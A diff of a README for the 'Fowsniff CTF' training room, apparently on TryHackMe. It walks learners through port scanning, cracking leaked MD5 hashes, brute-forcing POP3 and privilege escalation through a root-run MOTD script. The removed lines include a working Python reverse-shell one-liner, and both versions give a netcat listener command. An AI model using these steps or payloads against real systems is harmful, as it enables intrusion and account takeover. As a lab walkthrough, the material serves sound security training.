@@ -1,32 +1,147 @@
-🏷️ *Room Name =* **Fowsniff CTF**
+# 🎯 Fowsniff-CTF | Room Overview & Walkthrough Guide
 
-📝 *Room Description =* 
+---
 
-Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!
+<div align="center">
 
-This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!
+## 🐦 Room Name: **Fowsniff CTF** 
 
-This will be structured to go through what you need to do, step by step. Make sure you are connected to our network
+![Difficulty Badge](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
+![Category Badge](https://img.shields.io/badge/Category-Boot2Root-blue?style=for-the-badge)
 
-Credit to berzerk0(opens in new tab) for creating this machine. This machine is used here with the explicit permission of the creator <3
+</div>
 
+---
 
-❓ *Room Questions =*
+## 📝 Room Description
 
-| #   | Question                                                              | 💡 Hint                                                                                                                                                                                                          |
-|-----|-----------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-| Q1  | Deploy the machine. On the top right of this you will see a Deploy button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live.                       			      | Nothing                                                                                                                                                                                                          |
-| Q2  | Using nmap, scan this machine. What ports are open?                       			      | nmap -A -p- -sV MACHINE_IP                                                                                                                                                                                                          |
-| Q3  | Using the information from the open ports. Look around. What can you find?                       			      | Nothing                                                                                                                                                                                                          |
-| Q4  | Using Google, can you find any public information about them?                       			      | There is a pastebin with all of the company employees emails and hashes. If the pastebin is down, check out TheWayBackMachine, or https://github.com/berzerk0/Fowsniff                                                                                                                                                                                                          |
-| Q5  | Can you decode these md5 hashes? You can even use sites like hashkiller (opens in new tab) to decode them.                       			      | Nothing                                                                                                                                                                                                          |
-| Q6  | Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?                       			      | In metasploit there is a packages called: auxiliary/scanner/pop3/pop3_login where you can enter all the usernames and passwords you found to brute force this machines pop3 service.                                                                                                                                                                                                          |
-| Q7  | What was seina's password to the email service?                     			      | Nothing                                                                                                                                                                                                          |
-| Q8  | Can you connect to the pop3 service with her credentials? What email information can you gather?                       			      | Use netcat with the port 110 to view her emails. nc <ip> 110                                                                                                                                                                                                          |
-| Q9  | Looking through her emails, what was a temporary password set for her?                       			      | Nothing                                                                                                                                                                                                          |
-| Q10  | In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.                       			      | Nothing                                                                                                                                                                                                          |
-| Q11  | Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?                       			      | cube.sh Let me know if you want any help.                                                                                                                                                                                                          |
-| Q12  | Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?Python Reverse Shell:python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'Other reverse shells: here (opens in new tab).                       			      | Nothing                                                                                                                                                                                                          |
-| Q13  | If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in /etc/update-motd.d/ file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!                       			      | Nothing                                                                                                                                                                                                          |
-| Q14  | Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!                       			      | Nothing                                                                                                                                                                                                          |
-| Q15  | If you are really really stuck, there is a brilliant walkthrough here: https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/ (opens in new tab)  (opens in new tab)If its easier, follow this walkthrough with the deployed machine on the site.                       			      | Nothing                                                                                                                                                                                                          |
+Hack this machine and get the flag. There are lots of hints along the way and it's perfect for beginners!
+
+This boot2root machine is excellent for newcomers. You will need to:
+- Enumerate the machine by finding open ports
+- Conduct online research (it's amazing how much information Google can provide)
+- Decode hashes and credentials
+- Brute-force POP3 login attempts
+- And much more!
+
+This walkthrough is structured to guide you step by step through what you need to accomplish. Make sure you are [connected to the TryHackMe network](https://tryhackme.com/access).
+
+**Credit to [berzerk0](https://twitter.com/berzerk0)** for creating this machine. *This machine is used here with the explicit permission of the creator* ❤️
+
+---
+
+## ❓ Room Questions & Tasks
+
+| # | Question | 💡 Hint |
+|:---:|:---|:---|
+| **Q1** | Deploy the machine. On the top right of this you will see a Deploy button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live. | N/A |
+| **Q2** | 🔍 **Using nmap, scan this machine. What ports are open?** | `nmap -A -p- -sV MACHINE_IP` |
+| **Q3** | 🕵️ **Using the information from the open ports. Look around. What can you find?** | Check web servers, mail services, SSH banners |
+| **Q4** | 🔎 **Using Google, can you find any public information about them?** | Check Pastebin, GitHub (berzerk0/Fowsniff), or Wayback Machine |
+| **Q5** | 🔐 **Can you decode these MD5 hashes?** | Use hashkiller, Crackstation, or online hash lookup services |
+| **Q6** | ⚔️ **Using the usernames and passwords you captured, can you use Metasploit to brute force the POP3 login?** | Use `auxiliary/scanner/pop3/pop3_login` in Metasploit or Hydra |
+| **Q7** | 📧 **What was Seina's password to the email service?** | Brute-force results will reveal this |
+| **Q8** | 💌 **Can you connect to the POP3 service with her credentials? What email information can you gather?** | Use `nc <ip> 110` to access POP3 |
+| **Q9** | 🔑 **Looking through her emails, what was a temporary password set for her?** | Check email content from admin |
+| **Q10** | 👤 **In the email, who sent it? Using the password from the previous question and the sender's username, connect to the machine using SSH.** | SSH into the system with admin credentials |
+| **Q11** | 👥 **Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?** | Check `id` and `ls -la` in group-writable directories. Look for `cube.sh` |
+| **Q12** | ⚙️ **Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?** | Add reverse shell to the editable file |
+| **Q13** | 🚀 **This file is run as root when a user connects via SSH (banner/MOTD). Include it in `/etc/update-motd.d/` to execute as root** | Edit `/etc/update-motd.d/` to trigger your reverse shell |
+| **Q14** | 🏆 **Start a netcat listener (`nc -lvp 1234`) and then re-login to SSH. You will receive a reverse shell as root!** | `nc -lvp 1234` on your machine, then SSH to target |
+| **Q15** | 📚 **Stuck? There's a brilliant walkthrough available** | [HackingArticles Fowsniff Walkthrough](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/) |
+
+---
+
+## 🎓 Key Learning Objectives
+
+By completing this room, you will master:
+
+✅ **Port Scanning & Enumeration**
+- Using Nmap to discover open services
+- Identifying service versions and vulnerabilities
+
+✅ **OSINT & Information Gathering**
+- Social media reconnaissance
+- Public database searches and archives
+- Credential leaks and data breaches
+
+✅ **Cryptography & Hash Cracking**
+- MD5 hash identification
+- Online hash lookup services
+- Rainbow tables and hash crackers
+
+✅ **Password Attacks**
+- Brute-force methodology
+- Email service exploitation
+- Credential reuse detection
+
+✅ **Email Protocol Exploitation**
+- POP3 protocol basics
+- Email extraction via Netcat
+- Information disclosure via email
+
+✅ **Privilege Escalation**
+- Group-based privilege escalation
+- Cron job and MOTD exploitation
+- Reverse shell execution
+
+---
+
+## 🛠️ Tools You'll Use
+
+| Tool | Purpose |
+|:---|:---|
+| **Nmap** | Port scanning and service enumeration |
+| **curl/wget** | Web reconnaissance |
+| **Metasploit/Hydra** | POP3 brute-forcing |
+| **Netcat (nc)** | Email retrieval, reverse shells |
+| **SSH** | Remote system access |
+| **Hashcat/Crackstation** | Hash cracking |
+| **Text editors** | Privilege escalation via file editing |
+
+---
+
+## 💡 Pro Tips
+
+🎯 **Reconnaissance is Key** — Spend time enumerating. The more information you gather, the easier exploitation becomes.
+
+🔍 **Google is Your Friend** — Real-world penetration testing often involves OSINT. Learn to search effectively.
+
+🔐 **Hash Cracking Takes Time** — Some hashes crack instantly with online services, others require wordlists or computational power.
+
+📧 **Protocol Understanding** — Understanding POP3 and email protocols helps you extract maximum value from compromised accounts.
+
+🚀 **Privilege Escalation** — The final steps often rely on group permissions and scheduled tasks. Always check `/etc/update-motd.d/` and cron jobs.
+
+---
+
+## ✅ Room Completion Checklist
+
+- [ ] Deploy the machine successfully
+- [ ] Identify 4 open ports using Nmap
+- [ ] Find public information about Fowsniff Corp
+- [ ] Crack MD5 hashes from the breach data
+- [ ] Brute-force POP3 service and find Seina's credentials
+- [ ] Extract email contents
+- [ ] Find the temporary SSH password
+- [ ] SSH into the system as the admin user
+- [ ] Identify group-writable files (cube.sh)
+- [ ] Edit cube.sh to add a reverse shell
+- [ ] Configure MOTD to execute cube.sh as root
+- [ ] Receive root shell via reverse connection
+- [ ] Capture the final flag
+- [ ] Complete and submit the room
+
+---
+
+<div align="center">
+
+### 🏆 **Ready to Hack?**
+
+Good luck! Remember: *Patience, persistence, and proper documentation are key to successful penetration testing.*
+
+**[View Full Solution Walkthrough →](./solution.md)**
+
+🔐 *Happy hacking, ethically and legally!*
+
+</div>
